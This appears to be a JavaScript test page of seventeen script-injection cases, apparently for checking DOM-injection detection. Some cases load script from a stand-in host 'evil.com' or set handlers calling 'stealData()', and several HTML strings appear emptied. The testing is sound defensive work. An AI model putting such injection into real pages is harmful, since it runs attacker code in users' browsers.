Script Injection Test

'; // Test 2: innerHTML with event handler (onerror) console.log('[Test 2] innerHTML with onerror handler'); container.innerHTML = ''; // Test 3: innerHTML with onclick handler console.log('[Test 3] innerHTML with onclick handler'); container.innerHTML = ''; // Test 4: createElement with script + src console.log('[Test 4] createElement with script src'); const script1 = document.createElement('script'); script1.src = 'https://evil.com/payload.js'; // Test 5: createElement with script + textContent console.log('[Test 5] createElement with script textContent'); const script2 = document.createElement('script'); script2.textContent = 'alert("Injected code");'; // Test 6: createElement with script + data: URL (base64) console.log('[Test 6] createElement with data: URL (base64)'); const script3 = document.createElement('script'); script3.src = 'data:text/javascript;base64,YWxlcnQoIkJhc2U2NCBpbmplY3Rpb24iKTs='; // Test 7: createElement with script + blob: URL console.log('[Test 7] createElement with blob: URL'); const script4 = document.createElement('script'); script4.src = 'blob:http://example.com/12345678-1234-1234-1234-123456789012'; // Test 8: appendChild with script element console.log('[Test 8] appendChild with script element'); const script5 = document.createElement('script'); script5.src = 'https://evil.com/appended.js'; document.body.appendChild(script5); // Test 9: insertBefore with script element console.log('[Test 9] insertBefore with script element'); const script6 = document.createElement('script'); script6.textContent = 'console.log("Inserted script")'; document.body.insertBefore(script6, document.body.firstChild); // Test 10: insertAdjacentHTML with script console.log('[Test 10] insertAdjacentHTML with script'); container.insertAdjacentHTML('beforeend', ''); // Test 11: document.write with script console.log('[Test 11] document.write with script'); // Note: Can't actually call document.write here as it would clear the page // But we'll test the instrumentation is set up // Test 12: setAttribute with onclick console.log('[Test 12] setAttribute with onclick'); const btn = document.createElement('button'); btn.setAttribute('onclick', 'evilFunction()'); // Test 13: setAttribute with onerror console.log('[Test 13] setAttribute with onerror'); const img = document.createElement('img'); img.setAttribute('onerror', 'stealData()'); // Test 14: outerHTML with script console.log('[Test 14] outerHTML with script'); const div = document.createElement('div'); container.appendChild(div); div.outerHTML = '
'; // Test 15: Multiple scripts in innerHTML console.log('[Test 15] Multiple scripts in innerHTML'); container.innerHTML = ''; // Test 16: innerHTML with multiple event handlers console.log('[Test 16] Multiple event handlers in innerHTML'); container.innerHTML = '
Test
'; // Test 17: data: URL without base64 console.log('[Test 17] data: URL without base64'); const script7 = document.createElement('script'); script7.src = 'data:text/javascript,alert("Not%20base64")'; console.log('[Script Injection Tests] All tests completed'); }, 100);
